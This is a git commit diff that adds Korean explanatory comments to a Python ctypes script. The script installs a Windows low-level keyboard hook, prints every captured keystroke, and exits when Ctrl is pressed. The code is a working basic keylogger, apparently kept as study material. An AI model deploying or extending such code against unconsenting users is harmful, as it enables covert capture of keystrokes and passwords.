a193f1d872738cbdf363407640672790897f68a6
tf8(x90c, lamagra i both used!) <97133739+x90hack@users.noreply.github.com>
2022-12-15 14:59:03 +0900

    Add files via upload

--- MessageHooking.py
+++ MessageHooking.py
@@ -1,48 +1,61 @@
 
+# import [모듈/속성명]으로 모듈과 속성을 로드함
 import sys
 from ctypes import *
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 
+# windll이라고 바로 객체의 dll 바이너리를 로드하는게 가능
 user32 = windll.user32
 kernel32 = windll.kernel32
 
+# 상수 선언
 WH_KEYBOARD_LL=13
 WM_KEYDOWN=0x0100
 CTRL_CODE = 162
 
+# 키보드 후킹을 위한 키로거 클래스 선언
 class keyLogger:
     def __init__(self):
-        self.lUser32 = user32
-        self.hooked = None
+        self.lUser32 = user32 # 클래스에서 쓸 lUser32 멤버 선언
+        self.hooked = None # 후킹 여부 (후킹되지 않음; 초기치)
     
+    # 후커 설치 멤버 함수
     def installHookProc(self, pointer):
+        # WIN32 API중 user32.dll::SetWindowsHookExA()를 호출해서 키보드 
+        # 후커 설치. pointer는 함수 포인터임
         self.hooked = self.lUser32.SetWindowsHookExA(
             WH_KEYBOARD_LL,
             pointer,
             kernel32.GetModuleHandleA(None),
             0
         )
+        # 후킹이 되지 않으면 False(안됨 리턴), 되면 True(되었음)
         if not self.hooked:
             return False
         return True
 
+    # 후커 언인스톨러 함수
     def uninstallHookProc(self):
         if self.hooked is None:
             return
+        # user32.dll::UnhookWindowsHookEx()로 후킹 지움
         self.lUser32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
         
+# CFUNCTYPE()으로 콜 백 함수 포인터를 선언해서 CMPFUNC로 함수를 호출하는 getFPTR() 함수
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
     
+# 후킹 프로시저 함수
 def hookProc(nCode, wParam, lParam):
+    # WM_KEYDOWN(키보드 입력)이 없을 땐 다음 키로거 후커로 계속 이동
     if wParam is not WM_KEYDOWN:
         return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
-    hookedKey = chr(lParam[0])
-    print(hookedKey)
-    if(CTRL_CODE == int(lParam[0])):
+    hookedKey = chr(lParam[0]) # 키보드가 입력 되었을 때, lParam[0] 메시지를 문자로 전환해 받음
+    print(hookedKey) # 후킹한 키 값 출력
+    if(CTRL_CODE == int(lParam[0])): # CTRL_CODE가 입력되면 후커 제거후 파이썬 종료
         print("Ctrl pressed, call uninstallHook")
         keyLogger.uninstallHookProc()
         sys.exit(-1)
@@ -52,10 +65,17 @@ def startKeyLog():
     msg = MSG()
     user32.GetMessageA(byref(msg),0,0,0)
 
+# 키로그 클래스 인스턴스 선언
 keyLogger = keyLogger()
+
+# pointer 함수 포인터에 getFPTR(hookProc)로 후킹 프로시저 함수 포인터 로딩
 pointer = getFPTR(hookProc)
 
+# 키로거 클래스의 installHookPorc(pointer)로 키로거 후커 설치
 if keyLogger.installHookProc(pointer):
     print("installed keyLogger")
 
+# 첫 메시지를 하나 받는 것으로 키로그를 시작하는 함수 호출
+# 설치한 hookProc 후커 함수에 의해 지속적으로 print 함수를 통해서
+# 키로깅된 문자 출력 되는 것임.
 startKeyLog()
